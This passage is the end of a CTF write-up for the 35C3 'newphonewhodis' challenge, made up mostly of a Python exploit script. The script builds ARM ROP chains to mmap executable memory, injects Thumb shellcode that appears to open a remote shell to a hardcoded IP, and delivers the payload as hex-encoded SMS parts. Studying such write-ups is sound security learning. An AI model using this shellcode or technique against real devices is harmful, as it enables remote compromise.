</span></span><span class=line><span class=cl><span class=c1>#0x00014b5a : ldr lr, [sp], #4 ; b.w #0x1263e</span>
</span></span><span class=line><span class=cl><span class=n>setlrjmpr3</span> <span class=o>=</span> <span class=mh>0x00014b5a</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>Register state when we take control of PC
</span></span></span><span class=line><span class=cl><span class=s2>r0             0x0                 0
</span></span></span><span class=line><span class=cl><span class=s2>r1             0x38024             229412
</span></span></span><span class=line><span class=cl><span class=s2>r2             0x35a70             219760
</span></span></span><span class=line><span class=cl><span class=s2>r3             0x35a70             219760
</span></span></span><span class=line><span class=cl><span class=s2>r4             0x61716161          1634820449
</span></span></span><span class=line><span class=cl><span class=s2>r5             0x61726161          1634885985
</span></span></span><span class=line><span class=cl><span class=s2>r6             0x61736161          1634951521
</span></span></span><span class=line><span class=cl><span class=s2>r7             0x61746161          1635017057
</span></span></span><span class=line><span class=cl><span class=s2>r8             0x61756161          1635082593
</span></span></span><span class=line><span class=cl><span class=s2>r9             0x61766161          1635148129
</span></span></span><span class=line><span class=cl><span class=s2>r10            0x61776161          1635213665
</span></span></span><span class=line><span class=cl><span class=s2>r11            0x61786161          1635279201
</span></span></span><span class=line><span class=cl><span class=s2>r12            0x7                 7
</span></span></span><span class=line><span class=cl><span class=s2>sp             0x7efe9b38          0x7efe9b38
</span></span></span><span class=line><span class=cl><span class=s2>lr             0x3f                63
</span></span></span><span class=line><span class=cl><span class=s2>pc             0x5a5a5a5a          0x5a5a5a5a
</span></span></span><span class=line><span class=cl><span class=s2>cpsr           0x600b0110          1611333904
</span></span></span><span class=line><span class=cl><span class=s2>fpscr          0x10                16
</span></span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl><span class=n>address</span> <span class=o>=</span> <span class=mh>0x177000</span>
</span></span><span class=line><span class=cl><span class=n>stderr</span> <span class=o>=</span> <span class=mh>0x00036E90</span>
</span></span><span class=line><span class=cl><span class=n>ropchain</span> <span class=o>=</span> <span class=n>c</span><span class=p>[:</span><span class=mi>74</span><span class=p>]</span> <span class=o>+</span> <span class=n>p32</span><span class=p>(</span><span class=n>stderr</span><span class=p>)</span> <span class=o>+</span> <span class=n>p32</span><span class=p>(</span><span class=n>address</span><span class=p>)</span> <span class=o>*</span> <span class=mi>4</span> 
</span></span><span class=line><span class=cl><span class=n>ropchain</span> <span class=o>=</span> <span class=n>ropchain</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>94</span><span class=p>,</span> <span class=s2>&#34;A&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>ropchain</span> <span class=o>+=</span> <span class=n>p32</span><span class=p>(</span><span class=n>r3popnothumb</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>ropchain</span> <span class=o>+=</span> <span class=n>p32</span><span class=p>(</span><span class=n>address</span><span class=p>)</span> <span class=c1>#r3 dont care</span>
</span></span><span class=line><span class=cl><span class=n>ropchain</span> <span class=o>+=</span> <span class=n>p32</span><span class=p>(</span><span class=n>r5pop</span><span class=o>+</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>ropchain</span> <span class=o>+=</span> <span class=n>p32</span><span class=p>(</span><span class=n>address</span><span class=p>)</span> <span class=c1>#r5 dont care</span>
</span></span><span class=line><span class=cl><span class=n>ropchain</span> <span class=o>+=</span> <span class=n>p32</span><span class=p>(</span><span class=n>r14pop</span><span class=o>+</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>ropchain</span> <span class=o>+=</span> <span class=n>p32</span><span class=p>(</span><span class=mh>0x1000</span><span class=p>)</span> <span class=c1>#r1 size</span>
</span></span><span class=line><span class=cl><span class=n>ropchain</span> <span class=o>+=</span> <span class=n>p32</span><span class=p>(</span><span class=n>address</span><span class=p>)</span> <span class=c1>#r4 dont care</span>
</span></span><span class=line><span class=cl><span class=n>ropchain</span> <span class=o>+=</span> <span class=n>p32</span><span class=p>(</span><span class=n>r234pop</span><span class=o>+</span><span class=mi>1</span><span class=p>)</span> <span class=c1>#pc</span>
</span></span><span class=line><span class=cl><span class=n>ropchain</span> <span class=o>+=</span> <span class=n>p32</span><span class=p>(</span><span class=mi>7</span><span class=p>)</span> <span class=c1>#r2 prot</span>
</span></span><span class=line><span class=cl><span class=n>ropchain</span> <span class=o>+=</span> <span class=n>p32</span><span class=p>(</span><span class=n>address</span><span class=p>)</span> <span class=c1>#r3 dont care</span>
</span></span><span class=line><span class=cl><span class=n>ropchain</span> <span class=o>+=</span> <span class=n>p32</span><span class=p>(</span><span class=n>address</span><span class=p>)</span> <span class=c1>#r4 dont care</span>
</span></span><span class=line><span class=cl><span class=n>ropchain</span> <span class=o>+=</span> <span class=n>p32</span><span class=p>(</span><span class=n>r03pop</span><span class=o>+</span><span class=mi>1</span><span class=p>)</span> <span class=c1>#pc</span>
</span></span><span class=line><span class=cl><span class=n>ropchain</span> <span class=o>+=</span> <span class=n>p32</span><span class=p>(</span><span class=n>address</span><span class=p>)</span> <span class=c1>#r0 addr</span>
</span></span><span class=line><span class=cl><span class=n>ropchain</span> <span class=o>+=</span> <span class=n>p32</span><span class=p>(</span><span class=mh>0x22</span><span class=p>)</span> <span class=c1>#r3 flags Anonimous</span>
</span></span><span class=line><span class=cl><span class=n>ropchain</span> <span class=o>+=</span> <span class=n>p32</span><span class=p>(</span><span class=n>mmap</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>ropchain</span> <span class=o>+=</span> <span class=n>p32</span><span class=p>(</span><span class=mh>0x0</span><span class=p>)</span> <span class=c1>#fildes</span>
</span></span><span class=line><span class=cl><span class=n>ropchain</span> <span class=o>+=</span> <span class=n>p32</span><span class=p>(</span><span class=mh>0x0</span><span class=p>)</span> <span class=c1>#off</span>
</span></span><span class=line><span class=cl><span class=n>ropchain</span> <span class=o>+=</span> <span class=n>p32</span><span class=p>(</span><span class=mh>0x41414141</span><span class=p>)</span> <span class=c1>#pc</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>r0             0xffffffff          4294967295
</span></span></span><span class=line><span class=cl><span class=s2>r1             0x9                 9
</span></span></span><span class=line><span class=cl><span class=s2>r2             0x76f9c6a0          1996080800
</span></span></span><span class=line><span class=cl><span class=s2>r3             0xffffffff          4294967295
</span></span></span><span class=line><span class=cl><span class=s2>r4             0x41414141          1094795585
</span></span></span><span class=line><span class=cl><span class=s2>r5             0x41414141          1094795585
</span></span></span><span class=line><span class=cl><span class=s2>r6             0x41414141          1094795585
</span></span></span><span class=line><span class=cl><span class=s2>r7             0x41414141          1094795585
</span></span></span><span class=line><span class=cl><span class=s2>r8             0x41414141          1094795585
</span></span></span><span class=line><span class=cl><span class=s2>r9             0x177000            1536000
</span></span></span><span class=line><span class=cl><span class=s2>r10            0x177000            1536000
</span></span></span><span class=line><span class=cl><span class=s2>r11            0x177000            1536000
</span></span></span><span class=line><span class=cl><span class=s2>r12            0x6                 6
</span></span></span><span class=line><span class=cl><span class=s2>sp             0x7ed1fd70          0x7ed1fd70
</span></span></span><span class=line><span class=cl><span class=s2>lr             0x76dde329          1994253097
</span></span></span><span class=line><span class=cl><span class=s2>pc             0x5a5a5a5a          0x5a5a5a5a
</span></span></span><span class=line><span class=cl><span class=s2>cpsr           0x200f0110          537854224
</span></span></span><span class=line><span class=cl><span class=s2>fpscr          0x10                16
</span></span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#0x000118c4 : strb r3, [r4] ; pop {r4, pc}</span>
</span></span><span class=line><span class=cl><span class=n>storer3r4</span> <span class=o>=</span> <span class=mh>0x000118c4</span>
</span></span><span class=line><span class=cl><span class=c1>#0x00013ad2 : str r2, [r3] ; pop {r4, pc}</span>
</span></span><span class=line><span class=cl><span class=n>storer2r3</span> <span class=o>=</span> <span class=mh>0x00013ad2</span>
</span></span><span class=line><span class=cl><span class=c1># 0x00013568 : str r4, [r3] ; mov r0, r1 ; pop {r4, pc}</span>
</span></span><span class=line><span class=cl><span class=n>storer4r3</span> <span class=o>=</span> <span class=mh>0x00013568</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>ropchain_second</span> <span class=o>=</span> <span class=s2>&#34;A&#34;</span><span class=o>*</span><span class=mi>126</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 0x00012a6a : pop {r3, pc}</span>
</span></span><span class=line><span class=cl><span class=n>popr3</span> <span class=o>=</span> <span class=mh>0x00012a6a</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>shellcode</span> <span class=o>=</span> <span class=s2>&#34;</span><span class=se>\x02\x20\x01\x21\x92\x1A\x0F\x02\x19\x37\x01\xDF\x06\x1C\x08\xA1\x10\x22\x02\x37\x01\xDF\x3F\x27\x02\x21\x30\x1c\x01\xdf\x01\x39\xFB\xD5\x05\xA0\x92\x1a\x05\xb4\x69\x46\x0b\x27\x01\xDF\xC0\x46\x02\x00\x12\x34\x25\x3b\x24\x28\x2f\x62\x69\x6e\x2f\x73\x68\x00</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>print</span> <span class=nb>len</span><span class=p>(</span><span class=n>shellcode</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>ropchain_second</span> <span class=o>+=</span> <span class=n>p32</span><span class=p>(</span><span class=n>r4pop</span><span class=o>+</span><span class=mi>1</span><span class=p>)</span> <span class=c1>#r4</span>
</span></span><span class=line><span class=cl><span class=n>ropchain_second</span> <span class=o>+=</span> <span class=n>shellcode</span><span class=p>[</span><span class=mi>0</span><span class=p>:</span><span class=mi>4</span><span class=p>]</span> <span class=c1>#r4</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>x</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=nb>len</span><span class=p>(</span><span class=n>shellcode</span><span class=p>),</span> <span class=mi>4</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>spiece_next</span> <span class=o>=</span> <span class=n>shellcode</span><span class=p>[</span><span class=n>x</span><span class=o>+</span><span class=mi>4</span><span class=p>:</span><span class=n>x</span><span class=o>+</span><span class=mi>8</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>x</span> <span class=o>&gt;=</span> <span class=nb>len</span><span class=p>(</span><span class=n>shellcode</span><span class=p>)</span><span class=o>-</span><span class=mi>4</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>spiece_next</span> <span class=o>=</span> <span class=n>p32</span><span class=p>(</span><span class=n>address</span><span class=o>+</span><span class=mi>1</span><span class=p>)</span> <span class=c1># These put jumping address in r4</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span> <span class=s2>&#34;done&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>ropchain_second</span> <span class=o>+=</span> <span class=n>p32</span><span class=p>(</span><span class=n>popr3</span><span class=o>+</span><span class=mi>1</span><span class=p>)</span> <span class=c1>#pc</span>
</span></span><span class=line><span class=cl>    <span class=n>ropchain_second</span> <span class=o>+=</span> <span class=n>p32</span><span class=p>(</span><span class=n>address</span><span class=o>+</span><span class=n>x</span><span class=p>)</span> <span class=c1>#r3 value</span>
</span></span><span class=line><span class=cl>    <span class=n>ropchain_second</span> <span class=o>+=</span> <span class=n>p32</span><span class=p>(</span><span class=n>storer4r3</span><span class=o>+</span><span class=mi>1</span><span class=p>)</span> <span class=c1>#pc</span>
</span></span><span class=line><span class=cl>    <span class=n>ropchain_second</span> <span class=o>+=</span> <span class=n>spiece_next</span> <span class=c1>#r4</span>
</span></span><span class=line><span class=cl><span class=c1>#add jump to address</span>
</span></span><span class=line><span class=cl><span class=n>ropchain_second</span> <span class=o>+=</span> <span class=n>p32</span><span class=p>(</span><span class=n>blxr4</span><span class=o>+</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>ropchain1</span> <span class=o>=</span> <span class=n>ropchain</span><span class=p>[:</span><span class=mi>134</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>ropchain2</span> <span class=o>=</span> <span class=n>ropchain</span><span class=p>[</span><span class=mi>134</span><span class=p>:]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>ropchain_second1</span> <span class=o>=</span> <span class=n>ropchain_second</span><span class=p>[:</span><span class=mi>134</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>ropchain_second2</span> <span class=o>=</span> <span class=n>ropchain_second</span><span class=p>[</span><span class=mi>134</span><span class=p>:</span><span class=mi>134</span><span class=o>*</span><span class=mi>2</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>ropchain_second3</span> <span class=o>=</span> <span class=n>ropchain_second</span><span class=p>[</span><span class=mi>134</span><span class=o>*</span><span class=mi>2</span><span class=p>:</span><span class=mi>134</span><span class=o>*</span><span class=mi>3</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=c1># ropchain_second4 = ropchain_second[134*3:]</span>
</span></span><span class=line><span class=cl><span class=nb>print</span> <span class=nb>len</span><span class=p>(</span><span class=n>ropchain_second4</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span> <span class=s2>&#34;smshex one 1 9999&#34;</span><span class=p>,</span> <span class=n>encode_part</span><span class=p>(</span><span class=mi>5</span><span class=o>+</span><span class=mi>5</span><span class=p>,</span> <span class=n>ropchain_second3</span><span class=p>,</span> <span class=n>max_part</span><span class=o>=</span><span class=mi>1</span><span class=p>,</span> <span class=n>CSMS</span><span class=o>=</span><span class=mi>23</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=s2>&#34;hex&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span> <span class=s2>&#34;smshex one 1 9999&#34;</span><span class=p>,</span> <span class=n>encode_part</span><span class=p>(</span><span class=mi>5</span><span class=o>+</span><span class=mi>6</span><span class=p>,</span> <span class=n>ropchain_second4</span><span class=p>,</span> <span class=n>max_part</span><span class=o>=</span><span class=mi>1</span><span class=p>,</span> <span class=n>CSMS</span><span class=o>=</span><span class=mi>24</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=s2>&#34;hex&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># print &#34;smshex one 1 9999&#34;, encode_part(5+4, ropchain_second2, max_part=1, CSMS=21).encode(&#34;hex&#34;)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>print</span> <span class=s2>&#34;smshex one 1 9999&#34;</span><span class=p>,</span> <span class=n>encode_part</span><span class=p>(</span><span class=mi>5</span><span class=o>+</span><span class=mi>3</span><span class=p>,</span> <span class=n>ropchain_second1</span><span class=p>,</span> <span class=n>max_part</span><span class=o>=</span><span class=mi>3</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=s2>&#34;hex&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span> <span class=s2>&#34;smshex one 1 9999&#34;</span><span class=p>,</span> <span class=n>encode_part</span><span class=p>(</span><span class=mi>5</span><span class=p>,</span> <span class=n>ropchain2</span><span class=p>,</span> <span class=n>max_part</span><span class=o>=</span><span class=mi>3</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=s2>&#34;hex&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span> <span class=s2>&#34;smshex one 1 9999&#34;</span><span class=p>,</span><span class=n>encode_part</span><span class=p>(</span><span class=mi>4</span><span class=p>,</span> <span class=n>ropchain1</span><span class=p>,</span> <span class=n>max_part</span><span class=o>=</span><span class=mi>3</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=s2>&#34;hex&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#35C3_n0k1a_pH0ne_i5_b3st_ph0n3</span>
</span></span></code></pre></div></div></div><script type=text/javascript src=/js/page.min.54b6f4371722649edbe871e431d8670d670878c22be8f36e229fe53cc9b786fe25a834def5e6de621f7a3e37b72bc8cd73839aa5ed907ed6cbd45cd3e1b0fa20.js integrity="sha512-VLb0NxciZJ7b6HHkMdhnDWcIeMIr6PNuIp/lPMm3hv4lqDTe9ebeYh96Pje3K8jNc4Oape2QftbL1FzT4bD6IA==" data-oid=views_writeups/2018-12-30-35c3ctf-newphonewhodis/index.md data-oid-likes=likes_writeups/2018-12-30-35c3ctf-newphonewhodis/index.md></script></section><footer class="pt-8 max-w-prose print:hidden"><div class=pt-8><hr class="border-dotted border-neutral-300 dark:border-neutral-600"><div class="flex justify-between pt-3"><span><a class="flex group mr-3" href=/writeups/2018-07-08-wctf-2018-party/><span class="mr-3 text-neutral-700 group-hover:text-primary-600 ltr:inline rtl:hidden dark:text-neutral dark:group-hover:text-primary-400">&larr;</span>
<span class="ml-3 text-neutral-700 group-hover:text-primary-600 ltr:hidden rtl:inline dark:text-neutral dark:group-hover:text-primary-400">&rarr;</span>
<span class="flex flex-col"><span class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500">Party - WCTF 2018</span>
<span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400"><time datetime=2018-07-08T00:00:00+00:00>8 July 2018</time>
</span></span></a></span><span><a class="flex text-right group ml-3" href=/writeups/2019-01-28-codegate-quals-2019-mini-converter/><span class="flex flex-col"><span class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500">mini converter - Codegate Quals 2019</span>
<span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400"><time datetime=2019-01-28T00:00:00+00:00>28 January 2019</time>
</span></span><span class="ml-3 text-neutral-700 group-hover:text-primary-600 ltr:inline rtl:hidden dark:text-neutral dark:group-hover:text-primary-400">&rarr;</span>
<span class="mr-3 text-neutral-700 group-hover:text-primary-600 ltr:hidden rtl:inline dark:text-neutral dark:group-hover:text-primary-400">&larr;</span></a></span></div></div></footer></article><div id=top-scroller class="pointer-events-none absolute top-[110vh] bottom-0 w-12 ltr:right-0 rtl:left-0"><a href=#the-top class="pointer-events-auto sticky top-[calc(100vh-5.5rem)] flex h-12 w-12 mb-16 items-center justify-center rounded-full bg-neutral/50 text-xl text-neutral-700 hover:text-primary-600 dark:bg-neutral-800/50 dark:text-neutral dark:hover:text-primary-400" aria-label="Scroll to top" title="Scroll to top">&uarr;</a></div></main><footer id=site-footer class="py-10 print:hidden"><nav class="flex flex-row pb-4 text-base font-medium text-neutral-500 dark:text-neutral-400"><ul class="flex flex-col list-none sm:flex-row"><li class="flex mb-1 ltr:text-right rtl:text-left sm:mb-0 ltr:sm:mr-7 ltr:sm:last:mr-0 rtl:sm:ml-7 rtl:sm:last:ml-0"><a class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2 flex items-center" href title></a></li></ul></nav><div class="flex items-center justify-between"><p class="text-sm text-neutral-500 dark:text-neutral-400">&copy;
2025
mhackeroni</p><p class="text-xs text-neutral-500 dark:text-neutral-400">Powered by <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500" href=https://gohugo.io/ target=_blank rel="noopener noreferrer">Hugo</a> & <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500" href=https://blowfish.page/ target=_blank rel="noopener noreferrer">Blowfish</a></p></div><script>mediumZoom(document.querySelectorAll("img:not(.nozoom)"),{margin:24,background:"rgba(0,0,0,0.5)",scrollOffset:0})</script><script type=text/javascript src=/js/process.min.ee03488f19c93c2efb199e2e3014ea5f3cb2ce7d45154adb3399a158cac27ca52831db249ede5bb602700ef87eb02434139de0858af1818ab0fb4182472204a4.js integrity="sha512-7gNIjxnJPC77GZ4uMBTqXzyyzn1FFUrbM5mhWMrCfKUoMdsknt5btgJwDvh+sCQ0E53ghYrxgYqw+0GCRyIEpA=="></script></footer><div id=search-wrapper class="invisible fixed inset-0 flex h-screen w-screen cursor-default flex-col bg-neutral-500/50 p-4 backdrop-blur-sm dark:bg-neutral-900/50 sm:p-6 md:p-[10vh] lg:p-[12vh] z-500" data-url=https://mhackeroni.it/><div id=search-modal class="flex flex-col w-full max-w-3xl min-h-0 mx-auto border rounded-md shadow-lg top-20 border-neutral-200 bg-neutral dark:border-neutral-700 dark:bg-neutral-800"><header class="relative z-10 flex items-center justify-between flex-none px-2"><form class="flex items-center flex-auto min-w-0"><div class="flex items-center justify-center w-8 h-8 text-neutral-400"><span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7 405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9.0 208 0S0 93.1.0 208s93.1 208 208 208c48.3.0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9.0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7.0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7.0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg></span></div><input type=search id=search-query class="flex flex-auto h-12 mx-1 bg-transparent appearance-none focus:outline-dotted focus:outline-2 focus:outline-transparent" placeholder=Search tabindex=0></form><button id=close-search-button class="flex items-center justify-center w-8 h-8 text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400" title="Close (Esc)">
<span class="relative block icon"><svg viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75.0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3 54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75.0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75.0-45.25s32.75-12.5 45.25.0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25.0s12.5 32.75.0 45.25l-105.4 105.4L310.6 361.4z"/></svg></span></button></header><section class="flex-auto px-2 overflow-auto"><ul id=search-results></ul></section></div></div></div></body></html>